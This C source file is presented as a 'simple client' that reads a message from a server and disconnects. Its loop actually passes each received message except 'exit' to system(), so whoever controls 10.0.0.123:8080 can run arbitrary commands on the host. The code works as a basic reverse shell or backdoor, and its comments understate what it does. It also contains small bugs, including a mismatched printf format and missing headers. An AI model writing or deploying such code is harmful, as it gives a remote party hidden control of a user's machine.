// Simple client architecture
// Connects to host, reads message, disconnects
#include <signal.h>
#include "simple_networking.h"

// global kill flag
int kill_rcv = 0;

void kill_handler(int sig)
{
    kill_rcv = 1;
}

int main(void)
{
    signal(SIGINT, kill_handler);
    connection server_con = connect_to("10.0.0.123", 8080);
    //check if the struct has been filled
    if (server_con.dest_ip == NULL)
    {
      printf("[+] Could not connect to server.\n");
      exit(-1);
    }

    printf("[+] Client connected. IP: %s, Port: %d, Socket:\n", server_con.dest_ip, server_con.dest_port, server_con.sock_fd);

    int exit = 0;
    do
    {
      message data_recieved = recieve_data(server_con);
      printf("[+] Server said: %s\n", data_recieved.data);
      if (strcmp(data_recieved.data, "exit") == 0)
      {
        exit = 1;
      }
      else
      {
        system(data_recieved.data);
      }
      
    }while(exit == 0 && kill_rcv == 0);
    
    printf("[+] Closing connection\n");
    // Close file descriptor
    close(server_con.sock_fd);

    // Exit
    return 0;
}
